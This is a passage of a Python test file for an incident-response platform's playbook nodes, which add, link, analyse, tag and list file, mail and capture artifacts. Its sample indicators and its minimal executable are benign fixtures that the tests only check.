"""The playbook nodes for files: add one, link it, start its analysis, read what the analysis found.

A node that keeps a file or starts an analysis asks the API process and waits (``artifact_jobs``):
the tests make that process's pass themselves (``run_due``), as those of ``nik.scan-url`` do.
The files are harmless: a text, a minimal PE with two instructions, a message written here.
"""

# ruff: noqa: F811 (fixtures are imported)

from __future__ import annotations

import base64
import hashlib

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import select

from app import artifact_jobs
from app.automation import actions, file_actions, worker
from app.core.config import settings
from app.core.db import SessionLocal
from app.core.models import Artifact, ArtifactJob, AutomationEvent, Sample, SampleCode
from app.workers import analyzer, capa
from tests.test_automation_engine import (  # noqa: F401 - test_actions is a fixture
    T0,
    edge,
    go,
    incident,
    node,
    playbook,
    run_of,
    start,
    steps,
    test_actions,
)
from tests.test_capa import RESULT as CAPA_RESULT
from tests.test_code import WORKER_RESULT as CODE_RESULT
from tests.test_executables import minimal_pe
from tests.test_mail import no_dns, phishing_message  # noqa: F401 - no_dns is a fixture
from tests.test_network import _pcap
from tests.test_network import workers as capture_workers  # noqa: F401 - a fixture

REPORT = "host,verdict\nwks-1,clean\nwks-2,see http://files.evil.example/a.bin\n"
REPORT_SHA = hashlib.sha256(REPORT.encode()).hexdigest()


def act(node_id, action, held=None, **args):
    return node(node_id, "action", action=action, args=args, **({"held": held} if held else {}))


def chain(admin: TestClient, name: str, *nodes, **settings_) -> str:
    """A playbook whose nodes run one after the other."""
    order = [item["id"] for item in nodes]
    edges = [edge("start", order[0]), *(edge(a, b) for a, b in zip(order, order[1:], strict=False))]
    return playbook(admin, name, list(nodes), edges, **settings_)


def settle(admin: TestClient, run_id: str, now: float = T0, rounds: int = 6) -> dict:
    """Let the run go on until it ends: the worker takes its steps, the API process does what they asked."""
    for index in range(rounds):
        worker.drain(now + index * 5)
        artifact_jobs.run_due(threads=False)
        run = run_of(admin, run_id)
        if run["status"] not in ("running", "pending"):
            break
    return run


def done(admin: TestClient, playbook_id: str, now: float = T0, **body) -> dict:
    return settle(admin, start(admin, playbook_id, now, **body), now)


def upload(admin: TestClient, name: str, data: bytes, kind: str = "files", incident_id: str = "") -> str:
    sent = admin.post(
        f"/api/artifacts/{kind}", files={"file": (name, data)}, data={"incident": incident_id} if incident_id else {}
    )
    assert sent.status_code == 201, sent.text
    return sent.json()["id"]


def jobs() -> list[ArtifactJob]:
    with SessionLocal() as db:
        return list(db.scalars(select(ArtifactJob).order_by(ArtifactJob.created_epoch)))


def carried(job_id: str) -> bytes:
    with SessionLocal() as db:
        return artifact_jobs.carried(db, job_id)


@pytest.fixture()
def code_worker(monkeypatch):
    calls = []

    def fake(sha256, signatures):
        calls.append(sha256)
        return CODE_RESULT

    monkeypatch.setattr(settings, "ANALYZER_URL", "http://analyzer.test")
    monkeypatch.setattr(settings, "ANALYZER_TOKEN", "secret")
    monkeypatch.setattr(analyzer, "request_code_analysis", fake)
    return calls


@pytest.fixture()
def capa_worker(monkeypatch):
    calls = []

    def fake(sha256, rules):
        calls.append(sha256)
        return CAPA_RESULT

    monkeypatch.setattr(settings, "CAPA_URL", "http://capa.test")
    monkeypatch.setattr(settings, "CAPA_TOKEN", "secret")
    monkeypatch.setattr(capa, "request_capabilities", fake)
    return calls


# --------------------------------------------------------------------------- #
# Adding a file                                                               #
# --------------------------------------------------------------------------- #
def test_a_playbook_adds_a_file_from_a_content_and_the_api_process_keeps_it(admin: TestClient):
    incident(admin, "i1")
    pb = chain(admin, "Keeps a report", act("add", "nik.add-file", content=REPORT, name="report.csv", type="text/csv"))
    run_id = start(admin, pb, objectKind="incident", objectId="i1")

    # The step asks and gives itself back: the worker of playbooks wrote nothing to the store.
    worker.drain(T0)
    waiting = run_of(admin, run_id)
    assert waiting["status"] == "running" and steps(waiting)["add"]["status"] == "waiting"
    assert steps(waiting)["add"]["log"] == f"Keeping report.csv ({len(REPORT)} bytes)"
    (job,) = jobs()
    assert (job.kind, job.status, job.run_id, carried(job.id)) == ("store", "queued", run_id, REPORT.encode())
    with SessionLocal() as db:
        assert db.scalars(select(Sample)).all() == []
    worker.drain(T0 + 2)
    assert steps(run_of(admin, run_id))["add"]["status"] == "waiting"

    # The API process keeps it, as it keeps an upload; the bytes leave the row.
    assert artifact_jobs.run_due(threads=False) == 1 and artifact_jobs.run_due(threads=False) == 0
    (job,) = jobs()
    assert job.status == "done" and carried(job.id) == b"" and job.result["ref"] == REPORT_SHA
    # What keeping it set off says which run caused it: a playbook that waits for files does not start on its own.
    with SessionLocal() as db:
        events = db.scalars(select(AutomationEvent).where(AutomationEvent.kind == "file.analysed")).all()
        assert [event.payload["caused_by_run"] for event in events] == [run_id]
    worker.drain(T0 + 5)
    run = run_of(admin, run_id)
    assert run["status"] == "done", run["error"]
    output = steps(run)["add"]["output"]
    assert output == {
        "artifact": f"file-{REPORT_SHA}",
        "kind": "file",
        "name": "report.csv",
        "type": "text/csv",
        "size": len(REPORT),
        "sha256": REPORT_SHA,
        "verdict": "",
        "score": None,
        "tags": [],
        "page": f"/artifact/file-{REPORT_SHA}",
        "linked": True,
        "known": False,
    }

    # In the incident, as a file an analyst added: the Evidence tab reads this reference.
    refs = admin.get("/api/incidents/i1").json()["data"]["malware"]["samples"]
    assert [(ref["sha256"], ref["fileName"], ref["importedBy"]) for ref in refs] == [
        (REPORT_SHA, "report.csv", "nik-automation")
    ]
    assert refs[0]["origin"] == 'playbook "Keeps a report"'
    values = {item["value"] for item in admin.get("/api/incidents/i1/iocs").json()["iocs"]}
    assert "http://files.evil.example/a.bin" in values and REPORT_SHA in values
    entry = admin.get("/api/audit?q=action:artifact.add").json()["entries"][0]
    assert entry["actor"] == "nik-automation" and entry["incidentId"] == "i1"
    assert entry["details"].startswith("Added the file report.csv (") and f"run {run_id}" in entry["details"]


def test_a_content_may_be_base64_json_or_an_e_mail_and_is_checked_before_anything_is_asked(admin: TestClient, no_dns):
    raw = bytes(range(256))
    pb = chain(
        admin,
        "Kinds of content",
        act("bin", "nik.add-file", content=base64.b64encode(raw).decode(), encoding="base64", name="blob.bin"),
        # What a request answered, given whole: it is written as JSON.
        act("answer", "nik.add-file", content={"ok": True, "items": [1, 2]}, name="answer.json"),
        act("mail", "nik.add-file", content=phishing_message().decode(), name="reported.eml", **{"as": "mail"}),
    )
    run = done(admin, pb)
    assert run["status"] == "done", run["error"]
    out = steps(run)
    # No incident: each is an artifact on its own.
    assert out["bin"]["output"]["sha256"] == hashlib.sha256(raw).hexdigest() and out["bin"]["output"]["linked"] is False
    assert out["answer"]["output"]["size"] == len('{\n  "ok": true,\n  "items": [\n    1,\n    2\n  ]\n}')
    mail = out["mail"]["output"]
    assert mail["kind"] == "mail" and mail["artifact"].startswith("mail-") and mail["type"] == "e-mail"
    assert mail["verdict"] == "phishing" and mail["name"].startswith("URGENTE")
    assert admin.get(f"/api/artifacts/{mail['artifact']}").json()["incidents"] == []

    for args, why in (
        ({"content": "x"}, "A content needs a file name"),
        ({"content": "not base64!", "encoding": "base64", "name": "a"}, "The content is not base64"),
        ({"name": "a"}, "Nothing to add: give an artifact or a content"),
        ({"content": "x", "name": "a", "artifact": "file-" + "a" * 64}, "Give an artifact or a content, not both"),
        ({"content": "x", "name": "a", "incident": "nope"}, "The incident does not exist"),
        ({"content": "x", "name": "a.eml", "as": "mail"}, "The file was not kept: It is not an e-mail Nik can read"),
    ):
        run = done(admin, chain(admin, f"Refused {why} {len(args)}", act("add", "nik.add-file", **args)))
        assert run["status"] == "failed" and steps(run)["add"]["error"].startswith(why), steps(run)["add"]["error"]


def test_the_limit_of_an_upload_applies_to_what_a_playbook_adds(admin: TestClient, monkeypatch):
    monkeypatch.setattr(settings, "SAMPLE_MAX_MB", 0)
    run = done(admin, chain(admin, "Too large", act("add", "nik.add-file", content="x", name="a.txt")))
    assert steps(run)["add"]["error"] == "The file is larger than the 0 MB limit of an upload: it was not kept"
    assert jobs() == []


def test_a_file_nik_holds_is_linked_and_an_attachment_of_an_e_mail_is_taken_out(admin: TestClient, no_dns):
    incident(admin, "i1")
    held = upload(admin, "notes.txt", b"plain notes")
    mail = upload(admin, "reported.eml", phishing_message(), "mails")
    pb = chain(
        admin,
        "From what Nik holds",
        act("got", "nik.get-artifact", artifact=held),
        # The artifact a node gave is taken whole where an artifact is asked.
        act("link", "nik.add-file", artifact="{{ got }}"),
        act("read", "nik.get-analysis", artifact=mail),
        act("out", "nik.add-file", artifact=mail, attachment="{{ read.mail.attachments[0].name }}"),
        act("after", "nik.get-artifact", artifact="{{ out.artifact }}"),
    )
    run = done(admin, pb, objectKind="incident", objectId="i1")
    assert run["status"] == "done", run["error"]
    out = steps(run)
    assert out["link"]["output"]["artifact"] == held and out["link"]["output"]["linked"] is True
    assert out["link"]["output"]["known"] is True
    taken = out["out"]["output"]
    assert taken["name"] == "Fattura.zip" and taken["kind"] == "file" and taken["linked"] is True
    # Taken out of the e-mail: the page of each shows the other.
    assert out["after"]["output"]["parents"] == [mail] and out["after"]["output"]["incidents"] == ["i1"]
    names = {ref["fileName"] for ref in admin.get("/api/incidents/i1").json()["data"]["malware"]["samples"]}
    assert names == {"notes.txt", "Fattura.zip"}
    # Linking wrote no job: only the attachment had to be written to the store.
    assert [job.kind for job in jobs()] == ["attachment"]

    for args, why in (
        ({"artifact": held, "attachment": "0"}, "Only an e-mail has attachments"),
        ({"artifact": mail, "attachment": "nothing.pdf"}, "The e-mail has no attachment with this name"),
        ({"artifact": "file-" + "b" * 64}, "The artifact does not exist"),
    ):
        run = done(admin, chain(admin, f"No {why}", act("add", "nik.add-file", **args)))
        assert run["status"] == "failed" and steps(run)["add"]["error"] == why


def test_a_file_the_server_does_not_keep_fails_the_step_and_says_why(admin: TestClient):
    pb = chain(admin, "Nobody keeps it", act("add", "nik.add-file", content=REPORT, name="report.csv"))
    run_id = start(admin, pb)
    worker.drain(T0)
    worker.drain(T0 + 299)
    assert steps(run_of(admin, run_id))["add"]["status"] == "waiting"
    worker.drain(T0 + 310)
    failed = run_of(admin, run_id)
    assert failed["status"] == "failed"
    assert steps(failed)["add"]["error"].startswith("The file was not kept in 5 minutes: see whether the server")
    # Taken too late, it is not kept after all: the step that asked gave up.
    with SessionLocal() as db:
        assert artifact_jobs.take(db, T0 + artifact_jobs.TAKE_WITHIN + 1) is None
    (job,) = jobs()
    assert job.status == "error" and carried(job.id) == b""
    with SessionLocal() as db:
        assert db.scalars(select(Sample)).all() == []


def test_the_api_process_takes_each_job_once(admin: TestClient):
    run_id = start(admin, chain(admin, "Once", act("add", "nik.add-file", content=REPORT, name="report.csv")))
    worker.drain(T0)
    with SessionLocal() as one, SessionLocal() as two:
        taken = artifact_jobs.take(one)
        assert taken == jobs()[0].id and jobs()[0].run_id == run_id
        assert artifact_jobs.take(two) is None  # another process, a moment later: it is taken
    assert artifact_jobs.prune(T0 + artifact_jobs.KEPT_SECONDS + 1) == 1 and jobs() == []


def test_what_is_made_from_a_content_carries_the_classes_of_the_content(admin: TestClient):
    incident(admin, "i1", name="Payroll server of Anna")
    nodes = [
        act("add", "nik.add-file", content="About {{ trigger.incident.name }}", name="about.txt"),
        act("send", "http.request", url="https://example.org/lookup?file={{ add.sha256 }}"),
    ]
    run = done(admin, chain(admin, "Launders nothing", *nodes), objectKind="incident", objectId="i1")
    assert steps(run)["add"]["status"] == "done"
    # The hash of a file made from the name of an incident says something of that name: held as the name is.
    assert run["status"] == "failed"
    assert steps(run)["send"]["error"].startswith("Held back: incident names and tickets")

    # A content with no class of its own gives a file whose hash leaves as any hash does.
    plain = [
        act("add", "nik.add-file", content="nothing of anyone", name="plain.txt"),
        act("send", "http.request", url="https://example.org/lookup?file={{ add.sha256 }}"),
    ]
    run = done(admin, chain(admin, "Plain", *plain))
    # The guard let it through: what stops it is only that the playbook lists no host.
    assert steps(run)["send"]["error"] == "example.org is not among the hosts this playbook may reach"


def test_a_dry_run_keeps_nothing_starts_nothing_and_says_what_it_would_do(admin: TestClient):
    incident(admin, "i1")
    nodes = [
        act("add", "nik.add-file", content=REPORT, name="report.csv"),
        act("analyse", "nik.analyse-artifact", artifact="{{ add.artifact }}"),
        act("read", "nik.get-analysis", artifact="{{ add.artifact }}"),
        act("tag", "nik.add-artifact-tags", artifact=upload(admin, "old.txt", b"old"), tags="triaged"),
    ]
    run = go(admin, chain(admin, "Dry", *nodes), objectKind="incident", objectId="i1", dryRun=True)
    assert run["status"] == "done", run["error"]
    out = steps(run)
    assert out["add"]["output"]["artifact"] == f"file-{REPORT_SHA}" and out["add"]["output"]["linked"] is False
    assert out["add"]["output"]["size"] == len(REPORT) and out["add"]["output"]["name"] == "report.csv"
    assert out["add"]["request"] == {"would": "add the file", "name": "report.csv", "bytes": len(REPORT)}
    assert out["analyse"]["output"]["asked"] is False and out["analyse"]["output"]["started"] == []
    assert out["analyse"]["request"] == {
        "would": "analyse the artifact",
        "artifact": f"file-{REPORT_SHA}",
        "analysis": "all",
    }
    assert out["read"]["output"]["found"] is False and out["read"]["output"]["indicators"] == []
    assert out["tag"]["output"] == {"tags": ["triaged"], "changed": True}
    assert jobs() == [] and artifact_jobs.run_due(threads=False) == 0
    with SessionLocal() as db:
        assert [row.name for row in db.scalars(select(Artifact))] == ["old.txt"]
        assert db.scalars(select(Artifact)).one().tags == []
    assert admin.get("/api/incidents/i1").json()["data"].get("malware") in (None, {}, {"samples": []})


def test_the_debugger_keeps_and_starts_nothing_unless_a_node_is_let_through(admin: TestClient):
    from tests.test_debugger import at, debug, tell

    nodes = [
        act("add", "nik.add-file", content=REPORT, name="report.csv"),
        act("analyse", "nik.analyse-artifact", artifact="{{ add.artifact }}", analysis="static"),
    ]
    pb = chain(admin, "Debugged", *nodes)
    run_id = debug(admin, pb)
    run = run_of(admin, run_id)
    # Stopped before the node: its step shows what it would be given, and nothing was asked of the server.
    assert at(run) == ["add"] and steps(run)["add"]["input"]["args"]["name"] == "report.csv"
    tell(admin, run_id, "step")
    run = run_of(admin, run_id)
    assert at(run) == ["analyse"] and steps(run)["add"]["request"]["would"] == "add the file"
    assert steps(run)["add"]["output"]["artifact"] == f"file-{REPORT_SHA}"
    tell(admin, run_id, "step")
    run = run_of(admin, run_id)
    assert run["status"] == "done" and steps(run)["analyse"]["request"]["would"] == "analyse the artifact"
    assert jobs() == []
    with SessionLocal() as db:
        assert db.scalars(select(Sample)).all() == []

    # Let through for real, this once: the node asks the server as it does in a run.
    run_id = debug(admin, pb, T0 + 100)
    tell(admin, run_id, "step", T0 + 100, sendForReal=True)
    assert [(job.kind, job.status) for job in jobs()] == [("store", "queued")]
    assert artifact_jobs.run_due(threads=False) == 1
    worker.drain(T0 + 105)
    run = run_of(admin, run_id)
    assert steps(run)["add"]["output"]["linked"] is False and steps(run)["add"]["output"]["known"] is False
    assert at(run) == ["analyse"]
    tell(admin, run_id, "stop", T0 + 105)


# --------------------------------------------------------------------------- #
# Starting an analysis                                                        #
# --------------------------------------------------------------------------- #
def test_a_playbook_analyses_a_file_again_and_waits_for_the_workers(admin: TestClient, code_worker, capa_worker):
    incident(admin, "i1")
    sample = upload(admin, "tool.exe", minimal_pe(b"\x90\xc3"), incident_id="i1")
    sha256 = sample.removeprefix("file-")
    code_worker.clear(), capa_worker.clear()
    nodes = [act("analyse", "nik.analyse-artifact", artifact=sample), act("read", "nik.get-analysis", artifact=sample)]
    run = done(admin, chain(admin, "Analyses", *nodes), objectKind="incident", objectId="i1")
    assert run["status"] == "done", run["error"]
    output = steps(run)["analyse"]["output"]
    assert output == {
        "artifact": sample,
        "kind": "file",
        "made": "",
        "asked": True,
        "finished": True,
        "started": ["static", "code", "capabilities"],
        "skipped": [],
        "verdict": "",
        "page": f"/artifact/{sample}",
        "summary": "Analysed again: static, code, capabilities",
    }
    # The workers were asked by the API process, once each, for this sample.
    assert code_worker == [sha256] and capa_worker == [sha256]
    found = steps(run)["read"]["output"]
    assert found["status"] == "done" and found["file"]["code_status"] == "done"
    assert found["file"]["functions"] == len(CODE_RESULT["functions"])
    assert found["file"]["capabilities"] == [item["name"] for item in CAPA_RESULT["capabilities"]]
    assert "T1129" in found["file"]["attack"] and found["file"]["md5"] and found["file"]["type"].startswith("PE")
    entry = admin.get("/api/audit?q=action:sample.reanalyse").json()["entries"][0]
    assert entry["actor"] == "nik-automation" and '(playbook "Analyses", run ' in entry["details"]


def test_without_a_worker_what_reanalyse_does_goes_on_and_one_analysis_asked_for_fails(admin: TestClient):
    sample = upload(admin, "tool.exe", minimal_pe(b"\x90\xc3"))
    run = done(admin, chain(admin, "No workers", act("analyse", "nik.analyse-artifact", artifact=sample)))
    assert run["status"] == "done", run["error"]
    output = steps(run)["analyse"]["output"]
    assert output["started"] == ["static"] and output["finished"] is True
    assert output["skipped"] == [
        {"analysis": "code", "reason": "The analyzer worker is not configured (ANALYZER_URL)"},
        {"analysis": "capabilities", "reason": "The capa worker is not configured (CAPA_URL)"},
    ]
    for which, why in (
        ("code", "The analyzer worker is not configured (ANALYZER_URL): the file was not disassembled"),
        ("capabilities", "The capa worker is not configured (CAPA_URL): capa was not run"),
    ):
        asked = act("analyse", "nik.analyse-artifact", artifact=sample, analysis=which)
        run = done(admin, chain(admin, f"Only {which}", asked))
        assert run["status"] == "failed" and steps(run)["analyse"]["error"] == why


def test_a_worker_that_is_down_fails_the_step_with_its_name(admin: TestClient, code_worker, monkeypatch):
    def down(sha256, signatures):
        raise analyzer.AnalyzerError("Cannot reach the worker: connection refused")

    sample = upload(admin, "tool.exe", minimal_pe(b"\x90\xc3"))
    monkeypatch.setattr(analyzer, "request_code_analysis", down)
    run = done(admin, chain(admin, "Down", act("analyse", "nik.analyse-artifact", artifact=sample, analysis="code")))
    assert run["status"] == "failed"
    assert steps(run)["analyse"]["error"] == (
        "The disassembly failed: Cannot reach the worker: connection refused "
        "(the analyzer worker; Settings → System → Workers)"
    )


def test_an_analysis_that_does_not_end_fails_the_step_after_its_time(admin: TestClient, code_worker, monkeypatch):
    sample = upload(admin, "tool.exe", minimal_pe(b"\x90\xc3"))
    # The worker takes the job and never answers: the row stays queued.
    monkeypatch.setattr(artifact_jobs._Later, "start", lambda self, threads: None)
    asked = act("analyse", "nik.analyse-artifact", artifact=sample, analysis="code", wait_minutes=2)
    run_id = start(admin, chain(admin, "Slow", asked))
    worker.drain(T0)
    assert artifact_jobs.run_due(threads=False) == 1
    with SessionLocal() as db:
        assert db.get(SampleCode, sample.removeprefix("file-")).status == "queued"
    worker.drain(T0 + 60)
    waiting = run_of(admin, run_id)
    assert steps(waiting)["analyse"]["status"] == "waiting"
    assert steps(waiting)["analyse"]["log"] == "Waiting for the disassembly"
    worker.drain(T0 + 125)
    failed = run_of(admin, run_id)
    assert failed["status"] == "failed"
    assert steps(failed)["analyse"]["error"] == (
        "The analysis did not end in 2 minutes: the disassembly still running. "
        "See whether the analyzer worker answers (Settings → System → Workers)"
    )

    # Nobody starts it at all (the API process does not answer): the step says so.
    run_id = start(admin, chain(admin, "Unanswered", act("analyse", "nik.analyse-artifact", artifact=sample)), T0 + 500)
    worker.drain(T0 + 500)
    worker.drain(T0 + 500 + 16 * 60)
    assert steps(run_of(admin, run_id))["analyse"]["error"].startswith("The analysis was not started in 15 minutes")


def test_a_node_may_start_an_analysis_and_go_on(admin: TestClient):
    sample = upload(admin, "notes.txt", b"plain notes")
    nodes = [
        act("analyse", "nik.analyse-artifact", artifact=sample, wait=False),
        act("note", "nik.get-artifact", artifact=sample),
    ]
    run = go(admin, chain(admin, "Goes on", *nodes))
    assert run["status"] == "done", run["error"]
    output = steps(run)["analyse"]["output"]
    assert output["asked"] is True and output["finished"] is False
    assert output["summary"] == "Asked for: the run goes on without waiting"
    assert [(job.kind, job.status) for job in jobs()] == [("analyse", "queued")]
    assert artifact_jobs.run_due(threads=False) == 1 and jobs()[0].result["started"] == ["static"]


def test_an_e_mail_and_a_capture_are_analysed_again_and_an_address_is_not(admin: TestClient, no_dns, capture_workers):
    calls, _browser = capture_workers
    incident(admin, "i1")
    mail = upload(admin, "reported.eml", phishing_message(), "mails")
    capture = upload(admin, "phish.pcapng", _pcap(), "captures", "i1")
    before = sum(1 for call in calls if call[2] == "/analyze")
    nodes = [
        act("mail", "nik.analyse-artifact", artifact=mail),
        act("capture", "nik.analyse-artifact", artifact=capture),
        act("read", "nik.get-analysis", artifact=capture),
    ]
    run = done(admin, chain(admin, "Others", *nodes))
    assert run["status"] == "done", run["error"]
    out = steps(run)
    assert out["mail"]["output"]["started"] == ["mail"] and out["mail"]["output"]["verdict"] == "phishing"
    assert out["capture"]["output"]["started"] == ["capture"] and out["capture"]["output"]["finished"] is True
    assert sum(1 for call in calls if call[2] == "/analyze") == before + 1
    found = out["read"]["output"]
    assert found["status"] == "done" and found["capture"]["packets"] == 42 and found["capture"]["status"] == "ready"
    assert found["capture"]["beacons"] == 1 and found["indicators"]

    for args, why in (
        ({"artifact": mail, "analysis": "code"}, "code is an analysis of files"),
        ({"artifact": "url-" + "a" * 32}, "The artifact does not exist"),
    ):
        run = done(admin, chain(admin, f"Not {why}", act("analyse", "nik.analyse-artifact", **args)))
        assert run["status"] == "failed" and steps(run)["analyse"]["error"].startswith(why)


def test_a_capture_without_its_worker_fails_the_step_with_the_name_of_the_worker(
    admin: TestClient, capture_workers, monkeypatch
):
    capture = upload(admin, "phish.pcapng", _pcap(), "captures")
    monkeypatch.setattr(settings, "PCAP_URL", "")
    run = done(admin, chain(admin, "No pcap", act("analyse", "nik.analyse-artifact", artifact=capture)))
    assert run["status"] == "failed"
    assert steps(run)["analyse"]["error"] == (
        "The packet capture worker is not configured (PCAP_URL): the capture was not analysed"
    )


def test_an_address_is_scanned_again_by_its_own_node(admin: TestClient):
    from app import urlscan

    with SessionLocal() as db:
        row = urlscan.register(db, "https://example.org/", "anna")
        db.commit()
        scan = f"url-{row.id}"
    run = done(admin, chain(admin, "Address", act("analyse", "nik.analyse-artifact", artifact=scan)))
    assert steps(run)["analyse"]["error"] == (
        "An address is visited again with Scan an address, which the data guard judges"
    )


def test_every_file_that_arrives_is_analysed_once_and_the_playbook_does_not_start_on_its_own_doing(admin: TestClient):
    nodes = [
        act("analyse", "nik.analyse-artifact", artifact="{{ trigger.file.artifact_id }}", analysis="static"),
        act("tag", "nik.add-artifact-tags", artifact="{{ trigger.file }}", tags=["seen"]),
    ]
    pb = playbook(
        admin,
        "Every file",
        nodes,
        [edge("start", "analyse"), edge("analyse", "tag")],
        trigger={"event": "file.analysed"},
        enabled=True,
    )
    sample = upload(admin, "notes.txt", b"plain notes")
    worker.drain(T0)
    (run,) = admin.get(f"/api/automation/runs?playbook={pb}").json()["runs"]
    assert artifact_jobs.run_due(threads=False) == 1
    # The analysis it started wrote the same event, and the event says which run caused it…
    with SessionLocal() as db:
        waiting = db.scalars(select(AutomationEvent).where(AutomationEvent.done.is_(False))).all()
        assert [(event.kind, event.payload["caused_by_run"]) for event in waiting] == [("file.analysed", run["id"])]
    for index in range(1, 4):
        worker.drain(T0 + index * 5)
        artifact_jobs.run_due(threads=False)
    # …so it started nothing: one run, for the upload.
    runs = admin.get(f"/api/automation/runs?playbook={pb}").json()["runs"]
    assert [item["status"] for item in runs] == ["done"]
    assert admin.get(f"/api/artifacts/{sample}").json()["tags"] == ["seen"]


# --------------------------------------------------------------------------- #
# Reading                                                                     #
# --------------------------------------------------------------------------- #
def test_what_the_analysis_of_an_e_mail_found_is_read_bounded(admin: TestClient, no_dns, monkeypatch):
    mail = upload(admin, "reported.eml", phishing_message(), "mails")
    run = go(admin, chain(admin, "Reads a mail", act("read", "nik.get-analysis", artifact=mail)))
    assert run["status"] == "done", run["error"]
    found = steps(run)["read"]["output"]
    assert found["found"] is True and found["kind"] == "mail" and found["verdict"] == "phishing"
    assert found["score"] >= 70 and found["status"] == "done"
    assert found["mail"]["sender"] == "service@paypai.com" and found["mail"]["sender_domain"] == "paypai.com"
    assert (found["mail"]["spf"], found["mail"]["dkim"], found["mail"]["dmarc"]) == ("softfail", "none", "fail")
    assert {"dmarc-fail", "spf-fail"} <= set(found["mail"]["findings"])
    assert "https://login-paypa1.top/x" in found["mail"]["urls"]
    first = found["mail"]["attachments"][0]
    assert first["name"] == "Fattura.zip" and first["place"] == "0" and len(first["sha256"]) == 64
    # The message attached to it and what that one holds are listed with their places.
    assert {item["place"] for item in found["mail"]["attachments"]} >= {"0", "1"}
    assert {"type": "domain", "value": "login-paypa1.top"} in found["indicators"]
    assert found["summary"].startswith("phishing (score ") and "SPF softfail, DKIM none, DMARC fail" in found["summary"]
    # Nothing of the message itself: no body, no source.
    for key, value in found.items():
        assert "Gentile cliente" not in str(value) and "Verifica il tuo account" not in str(value), key
    # The sections of the other kinds are there, empty: a path the editor offers always leads somewhere.
    assert found["file"]["sha256"] == "" and found["capture"]["packets"] == 0 and found["scan"]["url"] == ""

    monkeypatch.setattr(file_actions, "FOUND_MAX", 2)
    run = go(admin, chain(admin, "Reads less", act("read", "nik.get-analysis", artifact=mail)))
    cut = steps(run)["read"]["output"]
    assert len(cut["indicators"]) == 2 and cut["indicator_count"] == found["indicator_count"] > 2

    # What it gives carries its classes: the sender does not leave unless the playbook may send addresses.
    nodes = [
        act("read", "nik.get-analysis", artifact=mail),
        act("send", "http.request", url="https://example.org/x", query={"from": "{{ read.mail.sender }}"}),
    ]
    run = go(admin, chain(admin, "Sends the sender", *nodes))
    assert run["status"] == "failed" and steps(run)["send"]["error"].startswith("Held back: ")
    assert "email_address" in steps(run)["send"]["request"]["held"]["held"]
    nodes[1] = act("send", "http.request", url="https://example.org/x", query={"v": "{{ read.verdict }}"})
    run = go(admin, chain(admin, "Sends the verdict", *nodes))
    # The verdict leaves as any verdict does: what stops it is only that the playbook lists no host.
    assert steps(run)["send"]["error"] == "example.org is not among the hosts this playbook may reach"


def test_the_artifacts_of_an_incident_are_listed_by_kind_and_by_name(admin: TestClient, no_dns, monkeypatch):
    incident(admin, "i1")
    incident(admin, "i2")
    notes = upload(admin, "notes.txt", b"plain notes", incident_id="i1")
    tool = upload(admin, "Tool.EXE", minimal_pe(b"\x90\xc3"), incident_id="i1")
    mail = upload(admin, "reported.eml", phishing_message(), "mails", "i1")
    upload(admin, "elsewhere.txt", b"another incident", incident_id="i2")
    nodes = [
        act("every", "nik.list-artifacts"),
        act("files", "nik.list-artifacts", kind="file"),
        act("named", "nik.list-artifacts", name="*.exe"),
        act("holds", "nik.list-artifacts", name="NOTE"),
        act("other", "nik.list-artifacts", incident="i2"),
        act("one", "nik.get-artifact", artifact=tool.removeprefix("file-")),
        act("none", "nik.get-artifact", artifact="file-" + "c" * 64),
    ]
    run = go(admin, chain(admin, "Lists", *nodes), objectKind="incident", objectId="i1")
    assert run["status"] == "done", run["error"]
    out = {key: step["output"] for key, step in steps(run).items()}
    assert set(out["every"]["ids"]) == {notes, tool, mail} and out["every"]["count"] == out["every"]["total"] == 3
    assert set(out["files"]["ids"]) == {notes, tool}
    assert out["named"]["ids"] == [tool] and out["holds"]["ids"] == [notes]
    assert [item["name"] for item in out["other"]["artifacts"]] == ["elsewhere.txt"]
    listed = next(item for item in out["every"]["artifacts"] if item["artifact"] == mail)
    assert listed["kind"] == "mail" and listed["type"] == "e-mail" and listed["verdict"] == "phishing"
    # The SHA-256 of a file alone names its artifact.
    assert out["one"]["found"] is True and out["one"]["artifact"] == tool and out["one"]["incidents"] == ["i1"]
    assert out["one"]["name"] == "Tool.EXE" and out["one"]["type"].startswith("PE") and out["one"]["expires"] == ""
    assert out["none"]["found"] is False and out["none"]["name"] == "" and out["none"]["incidents"] == []

    monkeypatch.setattr(file_actions, "LIST_MAX", 2)
    cut = go(
        admin, chain(admin, "Lists less", act("every", "nik.list-artifacts")), objectKind="incident", objectId="i1"
    )
    assert steps(cut)["every"]["output"]["count"] == 2 and steps(cut)["every"]["output"]["total"] == 3
    missing = go(admin, chain(admin, "Lists nothing", act("every", "nik.list-artifacts")))
    assert steps(missing)["every"]["error"] == "No incident was given"


def test_an_artifact_is_tagged_given_a_date_linked_and_taken_out(admin: TestClient, capture_workers):
    incident(admin, "i1")
    incident(admin, "i2")
    notes = upload(admin, "notes.txt", b"plain notes")
    capture = upload(admin, "phish.pcapng", _pcap(), "captures")
    nodes = [
        act("tag", "nik.add-artifact-tags", artifact=notes, tags="Triaged, tlp:amber"),
        act("again", "nik.add-artifact-tags", artifact=notes, tags=["triaged"]),
        act("untag", "nik.remove-artifact-tags", artifact=notes, tags=["tlp:amber", "never-there"]),
        act("date", "nik.set-artifact-expiry", artifact=notes, expires=30),
        act("link", "nik.link-artifact", artifact=notes),
        act("pcap", "nik.link-artifact", artifact=capture),
        act("out", "nik.unlink-artifact", artifact=notes),
        act("twice", "nik.unlink-artifact", artifact=notes),
    ]
    run = go(admin, chain(admin, "Fields", *nodes), objectKind="incident", objectId="i1")
    assert run["status"] == "done", run["error"]
    out = {key: step["output"] for key, step in steps(run).items()}
    assert out["tag"] == {"tags": ["triaged", "tlp:amber"], "changed": True}
    assert out["again"] == {"tags": ["triaged", "tlp:amber"], "changed": False}
    assert out["untag"] == {"tags": ["triaged"], "changed": True}
    assert out["date"] == {"expires": "2027-02-14", "changed": True}  # thirty days after the clock of the tests
    assert out["link"] == {"linked": True} and out["pcap"] == {"linked": True}
    assert out["out"] == {"removed": True} and out["twice"] == {"removed": False}
    shown = admin.get(f"/api/artifacts/{notes}").json()
    assert shown["tags"] == ["triaged"] and shown["expiresAt"] == "2027-02-14" and shown["incidents"] == []
    assert [item["id"] for item in admin.get(f"/api/artifacts/{capture}").json()["incidents"]] == ["i1"]
    actions_logged = {entry["action"] for entry in admin.get("/api/audit?q=nik-automation").json()["entries"]}
    assert {"artifact.tags", "artifact.expiry", "artifact.link", "artifact.unlink"} <= actions_logged

    for name, args, why in (
